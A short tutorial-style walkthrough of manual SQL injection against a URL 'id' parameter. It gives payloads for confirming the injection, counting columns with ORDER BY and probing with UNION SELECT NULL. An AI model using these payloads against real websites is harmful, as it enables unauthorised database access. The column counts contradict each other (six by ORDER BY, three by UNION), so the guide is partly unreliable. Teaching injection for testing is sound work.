In the process of finding SQL on the desired website, we must look for pages and forums that we must enter, 

or for example, by clicking on an icon or item, a new section will open for us.

For example, by clicking on an item, a GET request is sent to the origin of the website, but the id parameter is added to the URL and the value 13 is requested.

    http://target.tld/product.php?id=13

In order to make sure that this id parameter is related to the DBMS, we test different values ​​in the id input value.

For example, we have already tested and we know that we have a value for id=18.

so => id=13'+'5  and URL endoce it: id = 13'%2b'5

If it works and the output of parameter id=18 is displayed, you can test other inputs as well


another query: 

    ?id=13'AND 1=1 %23
    ?id=13'AND 1=0 %23
    ?id=13' order by 1 %23    => always true query


You can find the number of columns with order by:

    ?id=13'order by 10 %23

We will send this request if we don't get a response, that means the number of columns is less than 10 Now we decrease one by one until we get the response on page 13 and find the number of columns.

    ?id=13'order by 9 %23 => 500
    ?id=13'order by 8 %23 => 500
    ?id=13'order by 7 %23 => 500 
    ?id=13'order by 6 %23 => 200 , the number of column=6

UNION is used to agree two queries. You can find the number of columns using UNION

    ?id=13'UNION SELECT NULL-- -            => ERROR!
    ?id=13'UNION SELECT NULL,NULL-- -       => ERROR!
    ?id=13'UNION SELECT NULL,NULL,NULL-- -  => No Error, so the number of columns is 3


    


    
    
    
